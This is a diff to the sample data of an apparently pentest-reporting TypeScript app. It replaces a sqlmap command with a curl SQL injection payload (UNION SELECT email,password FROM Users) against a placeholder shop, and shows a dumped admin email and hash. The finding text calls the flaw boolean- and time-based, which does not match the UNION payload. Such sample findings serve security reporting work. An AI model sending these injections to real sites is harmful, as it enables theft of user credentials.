@@ -354,7 +354,7 @@ export const SAMPLE_ENGAGEMENT: Engagement = {
                 'O parâmetro "q" do endpoint de busca é concatenado diretamente na consulta SQL. A extração inferencial de dados foi confirmada (boolean e time-based), permitindo leitura arbitrária do banco.',
             evidence: {
                 caption: 'Confirmação de injeção (PoC de leitura, não destrutiva)',
-                code: 'sqlmap -u "https://loja.acme.example/buscar?q=tenis" \\\n  --batch --technique=BT --dbms=postgres --banner\n# parameter \'q\' is injectable (boolean-based, time-based)',
+                code: '$ curl "https://loja.acme.example/buscar?q=tenis\' UNION SELECT email,password FROM Users--"\nHTTP/1.1 200 OK\n[+] admin@juice-sh.op : 0192023a7bbd73250516f069df18b500\n# parâmetro \'q\' injetável (boolean-based + time-based)',
             },
             businessImpact:
                 'Exfiltração potencial de toda a base de dados (clientes, pedidos, hashes de senha).',
